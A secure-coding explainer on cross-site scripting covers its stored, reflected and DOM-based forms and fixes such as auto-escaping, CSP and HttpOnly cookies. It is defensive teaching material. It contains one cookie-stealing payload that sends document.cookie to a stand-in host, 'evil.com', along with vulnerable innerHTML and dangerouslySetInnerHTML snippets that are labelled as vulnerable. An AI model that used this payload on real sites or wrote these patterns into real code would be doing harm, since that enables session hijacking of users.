---
title: Cross-Site Scripting (XSS)
summary: How attacker-controlled input ends up running as JavaScript in another user's browser, and why context-aware output encoding is the fix.
date: 2026-09-14
---

Cross-site scripting (XSS) is [SQL injection](/security/sql-injection)'s
sibling on the front end: an attacker gets their own JavaScript to run in
another user's browser, in the context of your site. It happens whenever
untrusted input is written into a page without being encoded for the
place it lands.

```js
// vulnerable — comment text is parsed as HTML, so <script> runs
container.innerHTML = `<p>${comment}</p>`;
```

If `comment` is `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`,
that code runs for everyone who views the comment.

## Three ways the payload reaches the page

- **Stored** — the payload is saved (a comment, a profile field) and served
  to every viewer.
- **Reflected** — the payload rides in a request (a URL query param) and is
  echoed straight back into the response. A typical version: the attacker
  sends a victim a link with the payload in the query string, the victim's
  browser requests that URL, the server writes the parameter straight into
  the response, and the victim's browser runs it as part of the page it
  just loaded.
- **DOM-based** — client-side JS reads attacker-controlled input
  (`location.hash`, `postMessage`) and writes it into the DOM.

Whichever route it takes, the injected script ends up running with the
victim's session and origin. It can read cookies and tokens, make
authenticated requests as the user, log keystrokes, rewrite the page, or
pivot to other attacks. It's a permanent fixture of the **OWASP Top 10** —
a periodically updated ranking of the web's most critical security risks —
and the vulnerable line usually looks completely ordinary.

## Let the framework encode it, don't strip tags by hand

Encode data for the context it's being inserted into — HTML body, HTML
attribute, JavaScript string, and URL each need different escaping. In
practice, don't do this by hand: use a templating layer that auto-escapes,
and let the framework build the DOM.

```jsx
// safe — React escapes the interpolated string automatically, so a
// comment containing "<script>" renders as inert text, not a tag
<p>{comment}</p>

// vulnerable — this opts back out of that escaping entirely
<div dangerouslySetInnerHTML={{ __html: comment }} />
```

React, and templating layers like it, escape any string you interpolate
into normal markup by default; you only get XSS back if you reach for
`dangerouslySetInnerHTML`, `innerHTML`, `eval`, or `document.write` with
untrusted data.

Layer on a **Content-Security-Policy** header as defense in depth — it can
block inline scripts and unknown script origins even if an injection slips
through — and set session cookies `HttpOnly` so a successful XSS still
can't read them (see [Session vs. Token Authentication](/security/session-vs-token-auth)).

## It applies anywhere untrusted data reaches the DOM

User-generated content, URL parameters, `postMessage` payloads, `Referer`,
even "safe-looking" fields like display names and error messages — treat
every one of them as hostile until it's been through the encoder. The
underlying rule is identical to SQL injection's: keep data and code
separate, and let the platform encode at the boundary, not "strip out
`<script>`," which attackers route around with event handlers,
`javascript:` URLs, and encoding tricks.
